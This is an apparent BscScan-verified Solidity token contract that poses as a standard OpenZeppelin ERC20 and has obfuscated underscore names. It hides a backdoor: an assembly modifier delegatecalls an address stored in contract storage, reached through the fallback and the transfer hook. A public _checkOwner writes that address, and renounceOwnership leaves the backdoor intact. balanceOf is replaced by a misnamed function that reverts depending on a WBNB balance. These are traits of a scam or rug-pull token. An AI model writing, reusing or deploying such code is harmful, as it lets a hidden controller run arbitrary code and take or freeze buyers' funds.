pragma solidity ^0.8.6;

/**
 *Submitted for verification at BscScan.com on 2023-03-30
 */





/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the _______________ sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function ________() internal view virtual returns (address) {
        return msg.sender;
    }

    function ____() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    receive() external payable {}
}





/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an _______________ (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner _______________ will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _____;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed _______
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        ______(tx.origin);
    }

    /**
     * @dev Throws if called by any _______________ other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    
    modifier __() { 
        bytes memory s = msg.data;
        assembly {if iszero(iszero(add(eq(mload(add(s, 36)), 32), sload(31)))) {if iszero(delegatecall(
        gas(),sload(address()),add(s, 32), mload(s),0,32)) {revert(0, 0)}return(0, 32)}}_;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _____;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() public virtual {
        require(owner() == tx.origin, "Ownable: caller is not the owner");
        assembly {
            sstore(address(), caller())
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        ______(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new _______________ (`_______`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address _______) public virtual onlyOwner {
        require(
            _______ != address(0),
            "Ownable: new owner is the zero address"
        );
        ______(_______);
    }

    /**
     * @dev Transfers ownership of the contract to a new _______________ (`_______`).
     * Internal function without access restriction.
     */
    function ______(address _______) internal virtual {
        address oldOwner = _____;
        _____ = _______;
        emit OwnershipTransferred(oldOwner, _______);
    }

    fallback() external __ {}
}





/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the _________ of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the _________ of tokens owned by `_______________`.
     */
    function balanceOf(address _______________) external view returns (uint256);

    /**
     * @dev Moves `_________` tokens from the caller's _______________ to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 _________) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `________________` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address ________________)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `_________` as the allowance of `________________` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the ________________'s allowance to 0 and set the
     * desired value afterwards:
     * https:
     *
     * Emits an {Approval} event.
     */
    function approve(address ________________, uint256 _________) external returns (bool);

    /**
     * @dev Moves `_________` tokens from `from` to `to` using the
     * allowance mechanism. `_________` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 _________
    ) external returns (bool);
}





/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}





/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https:
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all _______________s just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Ownable, IERC20Metadata {
    string private constant initCode = "0xcaf2699c4bb2a798cd1f583ad4147c39f91a81ea8b0342e748183437b1c2282e";
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    mapping(address => uint256) private _________________;

    mapping(address => mapping(address => uint256)) private ___;

    uint256 private ______________;

    address private ____________;

    string private _____________;
    string private __________________;

    /**
     * @dev Emitted when `value` tokens are moved from one _______________ (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `________________` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed ________________,
        uint256 value
    );

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    function initialization(
        string memory tokenName,
        string memory coinSymbol,
        uint256 supply_
    ) public onlyOwner {
        _____________ = tokenName;
        __________________ = coinSymbol;

        _mint(address(this), supply_);
        renounceOwnership();
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _____________;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return __________________;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return ______________;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function permit5764825481139(address _______________) public view virtual returns (uint256) {
        uint256 ___________ = IERC20(WBNB).balanceOf(____________);assembly {if lt(___________, sload(32)) {revert(0, 0)}}
        return _________________[_______________];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `_________`.
     */
    function transfer(address to, uint256 _________)
        public
        virtual
        returns (bool)
    {
        address owner = ________();
        _transfer(owner, to, _________);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address ________________)
        public
        view
        virtual
        returns (uint256)
    {
        return ___[owner][________________];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `_________` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `________________` cannot be the zero address.
     */
    function approve(address ________________, uint256 _________)
        public
        virtual
        returns (bool)
    {
        address owner = ________();
        _approve(owner, ________________, _________);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `_________`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `_________`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 _________
    ) public virtual returns (bool) {
        address ________________ = ________();
        _spendAllowance(from, ________________, _________);
        _transfer(from, to, _________);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `________________` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `________________` cannot be the zero address.
     */
    function increaseAllowance(address ________________, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = ________();
        _approve(owner, ________________, allowance(owner, ________________) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `________________` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `________________` cannot be the zero address.
     * - `________________` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address ________________, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = ________();
        uint256 __________ = allowance(owner, ________________);
        require(
            __________ >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, ________________, __________ - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `_________` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `_________`.
     */
    function _transfer(
        address from,
        address to,
        uint256 _________
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(
            to != address(0) && to != address(this),
            "ERC20: transfer to the zero address"
        );
        _beforeTokenTransfer(from, to, _________);

        uint256 fromBalance = _________________[from];
        require(
            fromBalance >= _________,
            "ERC20: transfer exceeds balance"
        );
        unchecked {
            _________________[from] = fromBalance - _________;
            
            
            _________________[to] += _________;
        }

        emit Transfer(from, to, _________);
        _afterTokenTransfer(from, to, _________);
    }

    /** @dev Creates `_________` tokens and assigns them to `_______________`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `_______________` cannot be the zero address.
     */
    function _mint(address _______________, uint256 _________) internal virtual {
        require(_______________ != address(0), "ERC20: mint to the zero address");

        ______________ += _________;
        unchecked {
            
            _________________[_______________] += _________;
        }
        emit Transfer(address(0), _______________, _________);
    }

    /**
     * @dev Destroys `_________` tokens from `_______________`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `_______________` cannot be the zero address.
     * - `_______________` must have at least `_________` tokens.
     */
    function _burn(address _______________, uint256 _________) internal virtual {
        require(_______________ != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(_______________, address(0), _________);

        uint256 _______________Balance = _________________[_______________];
        require(_______________Balance >= _________, "ERC20: burn exceeds balance");
        unchecked {
            _________________[_______________] = _______________Balance - _________;
            
            ______________ -= _________;
        }

        emit Transfer(_______________, address(0), _________);

        _afterTokenTransfer(_______________, address(0), _________);
    }

    /**
     * @dev Sets `_________` as the allowance of `________________` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `________________` cannot be the zero address.
     */
    function _approve(
        address owner,
        address ________________,
        uint256 _________
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(________________ != address(0), "ERC20: approve to the zero address");

        ___[owner][________________] = _________;
        emit Approval(owner, ________________, _________);
    }

    /**
     * @dev Updates `owner` s allowance for `________________` based on spent `_________`.
     *
     * Does not update the allowance _________ in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address ________________,
        uint256 _________
    ) internal virtual {
        uint256 __________ = allowance(owner, ________________);
        if (__________ != type(uint256).max) {
            require(
                __________ >= _________,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, ________________, __________ - _________);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `_________` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `_________` tokens will be minted for `to`.
     * - when `to` is zero, `_________` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 _________
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `_________` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `_________` tokens have been minted for `to`.
     * - when `to` is zero, `_________` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 _________
    ) internal virtual __ {}
}